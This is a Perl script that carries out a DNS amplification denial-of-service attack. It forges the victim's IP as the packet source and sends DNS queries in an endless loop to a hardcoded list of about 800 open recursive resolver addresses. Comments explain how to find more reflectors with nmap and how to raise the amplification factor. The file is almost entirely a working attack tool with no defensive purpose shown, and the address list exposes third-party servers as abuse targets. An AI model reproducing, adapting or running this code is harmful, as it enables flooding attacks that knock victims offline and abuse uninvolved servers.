#!/usr/bin/perl
#
# dns-baa.pl
# Recursive DNS Bandwidth amplification attack
# by ShadowHatesYou
# Shadow@SquatThis.net
#
# PS: To see if you can spoof, check out the ANA Spoofer project.
# http://spoofer.csail.mit.edu/
 
use Net::DNS::Resolver;
use Net::RawIP;
use strict;
 
# Populate this list with domain names with lots of A records. IRC server DNS pools are a good place to look.
# Large TXT records are good, too(you'll have to hack away at other parts of this to use TXT records)
my @name = ("irc.freenode.net");
my $names = "0"; #number of entries in @name, minus one.
 
# Populate this list with ONLY open, recursive dns servers.
# Try finding them with: nmap --script=dns-test-open-recursion.nse -p 53 --host-timeout 15s -vv -sU -P0 <CIDR>
my $nameservers;
my @nameservers = (
"88.232.88.50",
"200.28.211.131",
"88.103.35.251",
"69.13.40.46",
"200.106.46.45",
"201.230.205.171",
"88.3.204.57",
"88.5.8.30",
"201.230.201.129",
"202.59.186.46",
"83.3.142.210",
"200.87.53.234",
"200.10.234.194",
"72.9.235.99",
"88.5.255.27",
"201.15.226.58",
"69.61.65.208",
"201.230.99.240",
"12.104.199.65",
"202.53.128.64",
"208.116.1.254",
"61.153.159.218",
"88.2.215.64",
"12.98.169.33",
"201.230.168.204",
"88.2.33.24",
"62.108.97.238",
"69.65.101.238",
"210.4.158.199",
"88.2.209.107",
"88.16.176.255",
"200.121.81.108",
"88.17.221.168",
"88.16.85.39",
"201.230.43.84",
"88.100.0.81",
"88.8.114.188",
"201.204.25.102",
"88.198.20.123",
"88.3.38.233",
"88.2.207.15",
"202.218.215.158",
"201.230.83.178",
"201.230.43.123",
"203.156.87.190",
"210.1.31.146",
"200.90.237.231",
"200.142.88.2",
"70.19.123.219",
"62.41.202.33",
"60.49.243.85",
"69.59.220.154",
"208.76.83.10",
"69.12.30.200",
"200.90.232.76",
"88.227.73.178",
"69.50.222.58",
"88.0.62.113",
"88.2.106.133",
"69.36.3.173",
"202.234.228.35",
"88.103.167.179",
"200.101.195.93",
"69.50.192.123",
"88.2.211.208",
"88.2.122.176",
"88.199.90.140",
"88.0.2.119",
"88.224.223.17",
"88.2.196.170",
"62.249.201.201",
"88.16.51.65",
"203.156.87.42",
"201.230.169.238",
"202.218.5.125",
"88.18.45.168",
"62.41.238.97",
"88.3.138.164",
"201.6.116.242",
"12.44.216.18",
"60.52.5.3",
"83.2.178.197",
"69.94.109.181",
"202.239.172.2",
"69.64.69.247",
"208.122.42.230",
"200.106.19.83",
"69.69.33.94",
"88.100.88.223",
"88.3.119.216",
"200.41.60.156",
"88.208.238.81",
"60.18.228.86",
"201.240.7.10",
"208.76.83.197",
"88.2.16.71",
"201.230.186.249",
"88.0.39.0",
"201.230.179.150",
"202.222.21.92",
"88.24.146.243",
"88.7.138.31",
"202.218.49.201",
"88.247.54.155",
"88.0.191.188",
"202.228.204.153",
"208.37.12.206",
"201.230.203.198",
"88.8.49.80",
"69.16.229.226",
"203.200.144.125",
"88.103.10.129",
"208.187.231.80",
"69.4.67.12",
"201.22.160.215",
"62.41.176.49",
"88.169.116.74",
"88.234.242.0",
"64.0.234.129",
"195.5.253.129",
"208.53.194.174",
"201.230.232.161",
"70.15.86.27",
"69.72.163.120",
"62.234.179.147",
"88.18.208.147",
"88.18.2.85",
"61.220.4.43",
"88.2.217.184",
"88.7.204.254",
"88.26.35.159",
"88.2.122.140",
"12.154.129.236",
"60.241.84.179",
"200.110.132.146",
"69.16.234.150",
"88.208.229.8",
"200.60.242.73",
"88.2.168.224",
"88.103.24.70",
"88.14.160.2",
"208.229.144.183",
"64.6.233.176",
"208.76.213.117",
"62.103.75.37",
"69.16.202.151",
"88.2.251.179",
"200.69.232.113",
"203.183.140.157",
"62.149.36.48",
"88.2.220.94",
"208.67.35.122",
"88.27.145.155",
"203.125.106.130",
"88.18.71.168",
"62.132.101.57",
"69.16.192.146",
"69.16.230.10",
"69.72.147.132",
"88.102.24.145",
"201.230.75.127",
"88.17.210.67",
"69.59.21.200",
"88.2.253.56",
"201.16.253.169",
"69.65.106.137",
"88.27.230.146",
"88.244.13.252",
"201.230.238.248",
"88.24.184.242",
"88.8.13.223",
"12.37.212.242",
"208.76.210.124",
"195.5.28.211",
"200.6.221.205",
"69.64.60.188",
"72.10.45.45",
"64.7.183.82",
"88.100.191.109",
"88.253.53.139",
"88.103.138.38",
"88.230.226.130",
"208.76.215.221",
"12.51.48.198",
"69.42.77.39",
"88.2.18.29",
"203.152.211.212",
"88.16.117.141",
"88.2.240.53",
"88.2.48.168",
"72.9.250.212",
"200.121.7.87",
"88.100.11.90",
"201.10.173.160",
"88.19.1.172",
"88.2.153.109",
"69.8.136.163",
"202.235.200.223",
"69.94.132.14",
"88.2.168.188",
"88.3.89.107",
"61.145.114.106",
"208.70.74.133",
"62.66.237.153",
"200.101.192.23",
"88.37.177.90",
"88.16.125.25",
"88.245.106.252",
"88.0.16.10",
"88.2.32.86",
"88.147.155.220",
"201.2.245.245",
"88.2.98.204",
"200.195.71.137",
"202.224.32.6",
"88.2.176.216",
"208.76.83.34",
"88.2.233.14",
"88.2.136.51",
"200.189.65.235",
"72.9.229.168",
"72.4.161.173",
"88.2.80.62",
"200.166.229.140",
"69.57.133.117",
"88.247.40.232",
"88.18.195.91",
"200.106.45.149",
"88.84.145.86",
"200.106.33.225",
"88.23.231.19",
"88.27.82.158",
"208.79.176.62",
"62.149.231.91",
"88.2.251.146",
"208.76.210.212",
"69.72.223.115",
"88.84.131.92",
"88.11.132.140",
"88.230.78.48",
"201.63.156.85",
"88.8.141.153",
"60.56.118.102",
"69.16.199.5",
"69.72.165.75",
"203.73.183.94",
"208.76.83.4",
"200.111.82.194",
"72.9.155.12",
"202.58.192.129",
"62.84.131.115",
"69.73.131.141",
"202.63.42.102",
"69.50.192.128",
"208.76.214.144",
"69.57.190.182",
"62.14.212.228",
"69.42.217.102",
"201.230.83.150",
"69.65.127.138",
"200.137.177.150",
"88.5.254.89",
"88.3.33.158",
"88.100.42.78",
"88.231.92.168",
"88.3.102.176",
"12.37.212.250",
"202.215.206.186",
"69.72.165.2",
"88.1.232.76",
"88.2.219.250",
"202.222.163.4",
"88.56.19.250",
"88.2.240.158",
"208.68.233.217",
"88.8.35.108",
"88.103.105.161",
"61.178.176.51",
"88.103.129.56",
"88.0.125.192",
"62.4.83.235",
"12.135.64.89",
"61.114.232.223",
"208.76.210.72",
"88.3.74.3",
"88.103.164.233",
"61.27.146.50",
"88.230.210.64",
"200.110.132.145",
"88.191.80.102",
"200.152.192.98",
"61.100.2.117",
"69.16.252.56",
"88.19.234.150",
"208.98.44.207",
"88.235.247.161",
"88.2.81.35",
"69.0.235.110",
"88.247.35.98",
"88.1.158.239",
"208.76.210.78",
"88.9.127.117",
"88.100.88.85",
"200.113.54.83",
"60.248.11.126",
"69.16.220.243",
"61.194.65.214",
"88.2.19.130",
"202.60.88.215",
"62.193.243.220",
"69.69.81.151",
"88.5.243.205",
"88.2.49.59",
"88.103.136.227",
"208.77.208.124",
"202.218.215.185",
"62.161.102.174",
"201.230.123.94",
"201.246.122.227",
"72.9.149.162",
"62.5.197.25",
"88.2.175.101",
"208.100.55.81",
"62.66.230.201",
"201.201.136.57",
"88.8.51.148",
"88.3.14.81",
"200.249.144.70",
"88.146.68.104",
"203.175.64.55",
"88.97.240.54",
"201.200.230.254",
"202.41.220.216",
"201.230.107.181",
"195.6.104.206",
"88.2.188.117",
"88.58.48.174",
"201.230.153.4",
"69.8.5.64",
"203.141.60.4",
"88.247.116.96",
"208.68.210.66",
"69.93.70.174",
"88.0.232.16",
"88.2.231.241",
"200.121.10.32",
"200.203.100.97",
"208.76.213.80",
"61.175.244.59",
"88.3.59.14",
"69.65.123.192",
"88.7.100.68",
"201.22.214.101",
"88.116.160.37",
"201.230.239.128",
"88.2.152.25",
"202.179.112.193",
"200.203.108.138",
"88.17.250.190",
"200.91.242.197",
"88.131.43.38",
"201.155.205.235",
"201.230.75.66",
"12.178.75.38",
"88.100.230.20",
"88.0.52.111",
"88.8.241.184",
"72.10.220.11",
"208.57.99.230",
"88.2.160.191",
"72.9.245.74",
"69.70.9.110",
"88.119.128.62",
"203.191.40.168",
"208.38.23.66",
"202.99.204.158",
"72.9.154.166",
"88.6.201.44",
"62.133.200.46",
"201.22.6.221",
"88.16.224.62",
"88.100.233.39",
"88.231.84.211",
"208.79.233.27",
"201.230.6.121",
"208.76.210.151",
"201.222.135.145",
"212.1.54.194",
"72.3.144.148",
"200.45.112.16",
"60.249.7.94",
"62.66.252.193",
"201.195.129.234",
"201.237.84.38",
"88.231.171.221",
"69.0.233.220",
"200.106.25.170",
"62.12.93.241",
"88.3.239.151",
"88.2.24.83",
"62.39.252.84",
"202.228.204.149",
"88.8.241.254",
"62.153.66.98",
"201.56.69.3",
"201.230.94.246",
"69.10.35.142",
"88.3.88.147",
"88.7.65.161",
"200.243.125.136",
"208.101.6.127",
"69.93.196.182",
"69.65.104.2",
"88.16.112.28",
"88.20.128.117",
"201.196.131.34",
"88.227.195.183",
"88.100.109.101",
"69.94.112.141",
"208.77.102.158",
"200.121.29.188",
"88.103.164.171",
"69.16.252.224",
"202.218.38.199",
"88.23.81.137",
"203.192.133.114",
"69.5.78.113",
"212.8.200.198",
"201.230.21.86",
"88.24.205.116",
"200.43.219.114",
"88.103.133.160",
"88.252.229.89",
"60.53.24.182",
"88.26.37.220",
"69.31.23.178",
"88.2.237.207",
"69.72.234.211",
"69.68.244.34",
"69.50.14.163",
"62.4.70.134",
"62.4.18.237",
"70.17.202.27",
"88.2.81.30",
"88.26.167.188",
"88.14.166.211",
"88.249.69.129",
"88.16.5.171",
"88.8.189.144",
"61.18.100.157",
"88.16.29.210",
"201.238.163.73",
"88.2.164.231",
"88.25.31.222",
"200.62.176.93",
"88.113.64.21",
"88.2.164.157",
"69.60.111.13",
"88.83.237.33",
"69.3.133.23",
"208.70.148.234",
"88.103.183.98",
"88.84.142.129",
"88.2.209.104",
"200.121.7.32",
"208.79.235.61",
"200.73.181.139",
"88.236.10.69",
"69.9.33.3",
"61.59.134.28",
"88.2.236.31",
"69.9.32.24",
"88.230.160.150",
"12.10.250.111",
"88.11.211.198",
"69.80.224.167",
"88.0.3.254",
"88.2.232.107",
"69.61.37.28",
"88.2.80.79",
"62.41.218.169",
"201.219.39.2",
"69.93.90.12",
"88.14.178.92",
"62.149.233.71",
"208.79.232.71",
"88.48.222.105",
"62.133.137.145",
"88.2.0.180",
"201.73.208.209",
"69.10.154.6",
"201.246.99.79",
"69.57.176.163",
"88.7.201.92",
"88.102.21.237",
"88.18.36.150",
"201.230.236.3",
"201.230.228.59",
"88.2.49.9",
"200.138.22.240",
"88.2.218.141",
"88.2.193.138",
"60.49.35.121",
"88.1.49.124",
"88.208.218.215",
"202.174.104.194",
"208.189.87.71",
"88.5.74.134",
"88.7.223.19",
"200.27.40.235",
"88.2.65.235",
"88.3.160.67",
"61.247.229.130",
"69.73.138.110",
"12.135.198.9",
"61.250.92.147",
"12.35.162.130",
"202.89.177.22",
"208.100.9.81",
"70.21.119.45",
"202.65.114.35",
"202.134.82.25",
"88.2.154.93",
"200.102.249.3",
"200.43.228.86",
"88.103.132.122",
"64.2.164.85",
"12.14.151.26",
"69.16.193.194",
"208.70.74.213",
"195.5.253.135",
"60.56.214.37",
"62.240.166.130",
"61.11.175.193",
"60.48.19.89",
"88.3.139.232",
"208.81.176.19",
"201.73.208.165",
"88.254.117.214",
"88.16.241.72",
"200.241.52.2",
"69.72.160.229",
"88.2.49.205",
"69.31.115.134",
"210.10.111.36",
"88.3.13.72",
"88.24.108.56",
"62.41.185.129",
"202.65.114.12",
"201.230.115.57",
"200.106.10.247",
"69.36.5.26",
"88.27.34.92",
"202.89.180.171",
"200.242.213.68",
"60.32.122.169",
"201.230.0.153",
"88.27.173.10",
"69.36.2.125",
"88.6.114.88",
"60.32.102.152",
"88.0.167.206",
"60.50.166.5",
"88.0.129.208",
"208.33.154.80",
"88.10.134.130",
"208.186.130.37",
"88.232.88.92",
"62.41.242.1",
"88.231.65.13",
"69.67.189.68",
"88.3.88.215",
"201.204.0.50",
"88.103.65.132",
"201.230.4.95",
"203.157.182.5",
"72.9.244.198",
"200.242.245.229",
"88.2.32.29",
"201.246.107.240",
"202.28.94.67",
"203.70.117.192",
"208.122.211.14",
"88.2.48.166",
"62.173.70.97",
"88.230.245.169",
"88.250.64.100",
"88.7.220.243",
"88.249.160.122",
"88.0.184.7",
"88.230.199.118",
"88.2.153.194",
"62.64.106.103",
"208.76.214.50",
"208.101.36.112",
"208.53.176.145",
"200.106.44.73",
"202.212.213.12",
"208.53.144.5",
"88.204.154.50",
"200.106.3.211",
"202.222.19.17",
"88.7.0.150",
"201.230.3.110",
"88.0.2.22",
"201.17.131.82",
"62.77.75.14",
"88.2.173.198",
"69.4.116.139",
"88.8.120.177",
"88.5.245.99",
"201.230.81.215",
"88.1.230.164",
"88.17.208.121",
"62.14.211.199",
"69.7.18.10",
"62.112.129.137",
"88.25.137.161",
"69.67.208.132",
"202.189.251.187",
"69.67.189.34",
"201.230.17.17",
"200.106.33.87",
"88.91.197.98",
"88.2.253.118",
"208.87.242.44",
"202.165.193.82",
"61.192.220.191",
"61.195.148.66",
"202.218.119.100",
"62.94.172.46",
"83.3.116.19",
"69.93.113.244",
"70.20.202.70",
"64.0.160.78",
"88.20.67.104",
"88.26.176.20",
"88.7.207.238",
"62.94.196.116",
"69.16.229.97",
"12.37.212.217",
"88.6.35.93",
"208.42.219.98",
"210.10.49.82",
"62.131.102.40",
"88.102.54.176",
"69.36.8.13",
"88.6.197.55",
"69.34.146.76",
"201.240.6.46",
"201.230.103.106",
"69.72.153.195",
"88.3.244.164",
"88.250.225.248",
"60.52.131.161",
"88.100.176.118",
"200.6.220.141",
"202.215.23.35",
"88.0.130.148",
"62.140.229.3",
"62.92.146.30",
"12.135.66.33",
"88.208.217.142",
"88.2.48.62",
"201.226.107.131",
"208.64.36.80",
"88.103.174.114",
"88.0.36.110",
"88.9.183.34",
"88.11.34.31",
"200.106.17.194",
"69.3.133.74",
"62.22.9.18",
"88.47.141.218",
"88.26.20.249",
"88.2.239.42",
"203.141.224.11",
"88.26.24.227",
"69.68.235.44",
"200.23.84.208",
"88.11.115.13",
"200.113.11.5",
"88.100.230.81",
"208.68.133.69",
"72.10.44.126",
"88.2.213.246",
"69.94.107.153",
"88.103.91.177",
"61.115.228.249",
"88.100.25.120",
"69.16.226.130",
"88.2.153.195",
"88.27.254.252",
"208.76.215.62",
"208.187.240.66",
"200.121.44.20",
"201.230.77.240",
"88.103.168.136",
"88.224.242.27",
"62.38.194.97",
"88.18.1.182",
"88.3.4.193",
"69.0.220.98",
"201.238.237.154",
"88.7.168.142",
"72.9.90.208",
"62.233.178.227",
"201.15.45.185",
"69.0.220.164",
"61.93.253.102",
"88.100.212.229",
"88.1.161.152",
"200.101.192.214",
"203.88.121.103",
"61.57.38.3",
"88.2.153.126",
"200.16.252.104",
"88.19.166.59",
"200.45.169.227",
"88.27.57.192",
"202.215.118.69",
"200.112.100.76",
"69.72.244.61",
"88.16.126.205",
"61.100.180.56",
"69.72.165.49",
"69.63.135.235",
"12.87.234.166",
"72.8.134.172",
"69.69.81.142",
"62.249.207.9",
"69.50.208.88",
"88.6.32.228",
"69.93.129.132",
"69.55.170.132",
"88.0.140.230",
"208.109.30.59",
"201.230.153.238",
"69.65.124.131",
"201.236.13.113",
"88.102.8.37",
"88.146.223.3",
"203.69.225.162",
"88.4.240.141",
"208.76.213.21",
"69.6.161.154",
"88.27.42.84",
"88.17.1.197",
"88.3.148.35",
"88.40.5.166",
"208.72.100.136",
"88.207.245.139",
"203.26.16.146",
"201.230.113.69",
"88.5.235.167",
"64.2.190.187",
"69.36.11.75",
"88.2.160.99",
"64.0.234.233",
"88.103.117.237",
"88.7.137.151",
"69.28.129.172",
"208.79.238.39",
"203.88.121.137",
"88.8.48.215",
"88.2.188.98",
"61.129.68.41",
"200.181.142.60",
"195.2.138.129",
"88.2.25.221",
"62.41.252.209",
"88.23.110.86",
"88.2.20.26",
"62.5.159.225",
"69.73.184.160",
"203.87.38.112",
"84.1.151.235",
"88.227.165.93",
"64.5.192.6",
"69.3.118.18",
"61.180.73.213",
"88.232.148.123",
"69.4.250.250",
"88.0.68.43",
"69.9.183.178",
"88.139.140.64",
"208.76.82.101",
"88.227.135.123",
"69.31.115.80",
"88.2.201.83",
"88.100.171.233",
"200.101.215.166",
"203.48.155.19",
"208.75.150.89",
"88.23.60.113",
"200.121.42.69",
"202.101.35.239",
"69.16.202.215",
"69.68.65.58",
"88.14.226.16",
"208.101.8.195",
"61.213.122.117",
"201.230.199.224",
"201.230.47.211",
"88.103.170.85",
"69.17.26.129",
"88.8.8.214",
"69.60.181.22",
"69.5.67.41",
"62.38.149.215",
"201.16.240.106",
"62.41.55.137",
"208.76.213.135",
"88.6.114.24",
"62.204.247.50",
"72.9.249.187",
"201.34.187.149",
"88.100.138.74",
"201.230.17.160"
 );
 
my $reflectors = "818"; # Number of entries in @nameservers, minus one.
 
##########################
# END USER CONFIGURATION #
##########################
 
my $str;
my $name;
my $src_ip;
my $reflector;
$src_ip = $ARGV[0];
 
if ($ARGV[0] eq '') { print "Usage: " . $0 . " <IP>\n"; exit(0); }
print ("Hitting $ARGV[0]\n");
 
while () {
    my $dnspacket = new Net::DNS::Packet($str, "A", "IN");
    my $dnsdata = $dnspacket->data;
    my $sock = new Net::RawIP({udp=>{}});
    $str = @name[int rand($names)];                            # Select entry from @name
    $reflector = $nameservers[int rand($reflectors)];          # Select entry from @nameservers
    $sock->set({ip => {
                saddr => $src_ip, daddr => "$reflector", frag_off=>0,tos=>0,id=>9000},
                udp => {source => 53,
                dest => 53, data=>$dnsdata
                } });
    $sock->send;
    $sock->set({ ip => { id=>9001} });
    $sock->send;
    $sock->set({ ip => { id=>9002} });
    $sock->send;
    $sock->set({ ip => { id=>9003} });
    $sock->send;
    $sock->set({ ip => { id=>9004} });
    $sock->send;
}
exit(0);
 
